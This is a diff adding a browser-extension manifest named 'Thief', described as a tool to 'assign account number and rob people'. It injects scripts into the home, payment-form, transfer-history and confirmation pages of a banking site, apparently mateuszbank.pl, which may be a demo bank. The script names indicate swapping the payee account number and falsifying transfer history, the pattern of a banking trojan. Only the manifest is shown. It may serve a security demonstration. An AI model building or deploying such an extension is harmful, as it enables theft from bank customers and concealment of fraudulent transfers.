@@ -1,0 +1,36 @@
+{
+
+    "manifest_version": 2,
+    "name": "Thief",
+    "version": "1.0",
+    "description": "Assign account number and rob people",
+
+    "icons": {
+        "48": "icon/icon_unlocked.png"
+    },
+
+    "content_scripts": [
+      {
+        "matches": ["https://mateuszbank.pl/home.php"],
+        "js": ["jquery.js", "activeNumber.js"]
+      },
+      {
+        "matches": ["https://mateuszbank.pl/historiaPrzelewow.php"],
+        "js": ["jquery.js", "changerHist.js"]
+      },
+      {
+        "matches": ["https://mateuszbank.pl/formPay.php"],
+        "js": ["jquery.js", "changerNum.js"]
+      },
+      {
+        "matches": ["https://mateuszbank.pl/zatwierdzPrzelew.php"],
+        "js": ["jquery.js", "saveJSON.js"]
+      }
+    ],
+
+    "permissions": [
+      "sessions",
+      "storage"
+    ]
+  
+}
